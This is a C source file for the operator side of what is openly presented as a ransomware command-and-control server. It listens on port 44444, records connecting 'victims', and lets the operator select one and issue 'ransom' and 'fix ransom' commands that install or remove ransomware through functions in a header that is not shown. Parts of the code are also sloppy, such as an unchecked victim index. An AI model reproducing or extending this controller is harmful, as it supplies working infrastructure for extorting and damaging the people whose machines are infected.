#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <process.h>
#include <stdbool.h>
#include <WS2tcpip.h>
#include "hostCommands.h"

#define PORT 44444
#define IP "127.0.0.1"
#define MAX_CONNECTED_VICTIMS 5

// Functions
unsigned int __stdcall startServer();
void getCommands();
void processCommand(char *command);
// Global varaibles
int selectedVictimSocket = -1, connectedVictimsAmount = 0, victimsSockets[MAX_CONNECTED_VICTIMS];

int startsWith(const char *a, const char *b)
{
    if (strncmp(a, b, strlen(b)) == 0)
        return 0;
    return 1;
}

int removeFromStr(char *str, const char note)
{
    /*
        Removes all [note] from [str]
        */
    int i;

    for (i = 0; i < strlen(str); i++)
    {
        if (str[i] == '\n')
            str[i] = '\0';
    }
}

unsigned int __stdcall startServer()
{
    /*
        The func starts the server
        */

    struct sockaddr_in hostAddress, victimAddress;
    int serverSocDesc, victimSocDesc, iResult, victimAddressLen = sizeof(struct sockaddr_in);
    ;
    WSADATA wsaData;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        exit(1);
    }

    printf("\nStarting server...\n");

    // Creates the socket
    if ((serverSocDesc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        printf("COULD NOT CREATE A SOCKET!\n");
        exit(1);
    }

    // Defines the host address
    hostAddress.sin_family = AF_INET;
    hostAddress.sin_addr.S_un.S_addr = inet_addr(IP);
    hostAddress.sin_port = htons(PORT);

    // Binds the socket
    if (bind(serverSocDesc, (struct sockaddr *)&hostAddress, sizeof(hostAddress)) < 0)
    {
        printf("COULD NOT BIND THE SOCKET!\n");
        exit(1);
    }

    // Listening
    if (listen(serverSocDesc, 5) < 0)
    {
        printf("COULD NOT LISTEN TO THE SOCKET!\n");
        exit(1);
    }

    while (true)
    {
        victimSocDesc = accept(serverSocDesc, (struct sockaddr *)&victimAddress, (socklen_t *)&victimAddressLen);

        printf("a new victim has been conncted!\n");
        // Adds the victim socket descreption to the victims sockets array - [victimsSockets]
        victimsSockets[connectedVictimsAmount] = victimSocDesc;
        connectedVictimsAmount++;
    }
}

void getCommands()
{
    /*
        Let's the user enter an commands at live
        */

    char *command = calloc(20, sizeof(char));

    while (true)
    {
        // Receives the commmand
        printf(">>");
        fgets(command, 20, stdin);
        removeFromStr(command, '\n');

        // Processes the command
        processCommand(command);
    }

    free(command);
}

void processCommand(char *command)
{
    /*
        Process [command]

        param 1: the command
        */

    // Checks the command

    if (strcmp(command, "help") == 0)
    {
        displayHelp();
    }
    else if (strcmp(command, "victims") == 0)
    {
        printf("There is %d connected victims\n", connectedVictimsAmount);
    }
    else if (startsWith(command, "select ") == 0)
    {
        char* indexPos;
        int vicitmIndex = 0;

        indexPos = strtok(command, " ");
        indexPos = strtok(NULL, " ");

        vicitmIndex = *indexPos - '0';

        selectedVictimSocket = victimsSockets[vicitmIndex];
        printf("The victim has been selected!\n");
    }
    else if (strcmp(command, "ransom") == 0)
    {
        // If there is no selected victim
        if (selectedVictimSocket == -1)
        {
            printf("YOU HAVE TO SELECT VICTIM BEFORE YOU ACTIVE COMMANDS ON HIM!\n");
            return;
        }

        installRansomware(selectedVictimSocket); // Installs the ransomware virus on the victim's pc
    }
    else if (strcmp(command, "fix ransom") == 0)
    {
        // If there is no selected victim
        if (selectedVictimSocket == -1)
        {
            printf("YOU HAVE TO SELECT VICTIM BEFORE YOU ACTIVE COMMANDS ON HIM!\n");
            return;
        }

        uninstallRansomware(selectedVictimSocket); // Uninstall the ransomware virus from the victim's pc
    }
    else
    {
        printf("UNKOWN COMMAND! TYPE help FOR MODE INFO...\n");
    }
}

int main(int argc, char const *argv[])
{
    _beginthreadex(0, 0, &startServer, 0, 0, 0); // Server thread
    getCommands();

    return 0;
}
